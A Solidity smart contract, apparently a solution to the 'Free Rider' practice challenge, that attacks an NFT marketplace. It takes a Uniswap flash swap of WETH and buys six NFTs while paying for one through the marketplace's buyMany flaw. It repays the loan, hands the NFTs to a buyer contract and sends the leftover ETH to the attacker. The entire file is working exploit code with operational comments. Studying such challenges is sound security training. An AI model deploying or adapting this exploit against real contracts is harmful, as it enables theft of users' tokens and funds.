// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FreeRiderNFTMarketplace.sol";

interface IWETH9 {
    function deposit() external payable;

    function withdraw(uint256 wad) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (uint256);
}

interface IUniswapPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract AttackerRider is IERC721Receiver {
    address private attacker;
    address private buyerContract;
    FreeRiderNFTMarketplace marketplace;
    IERC721 nft;
    IUniswapPair pair;
    IWETH9 weth;
    uint256 nftPrice = 15 ether;

    constructor(address _buyerContract, address _nft, address payable _marketplace, address _pair, address _weth) {
        attacker = msg.sender;
        buyerContract = _buyerContract;
        nft = IERC721(_nft);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        pair = IUniswapPair(_pair);
        weth = IWETH9(_weth);
    }

    function Attack() external {
        require(attacker == msg.sender, "Only attacker");
        //Taking flash loan to perform attack
        pair.swap(nftPrice, 0, address(this), abi.encode(address(weth)));
    }

    fallback() external {
        require(msg.sender == address(pair), "Only pair can call");
        require(weth.balanceOf(address(this)) == nftPrice, "Insufficient weth balance");
        //Converting WETH to ETh
        weth.withdraw(nftPrice);

        //Array with tokenIds[0,1,2,3,4,5]
        uint256[] memory totalNFTs = new uint[](6);
        for (uint256 i; i < 6; i++) {
            totalNFTs[i] = i;
        }

        //Buying all 6 and attacking marketplace vuln.
        marketplace.buyMany{value: nftPrice}(totalNFTs);
        uint256 fee = ((nftPrice * 3) / 997) + 1;
        uint256 amountToRepay = nftPrice + fee;

        //Converting back to Weth and paying flash loan
        weth.deposit{value: amountToRepay}();
        weth.transfer(msg.sender, amountToRepay);

        //Transfering all NFT's
        //But keep in mind you have to do safeTransferFrom(becouse it call onERC721Received) not TransferFrom
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), buyerContract, i);
        }

        //Paying back all ether to attacker
        (bool sent,) = payable(attacker).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
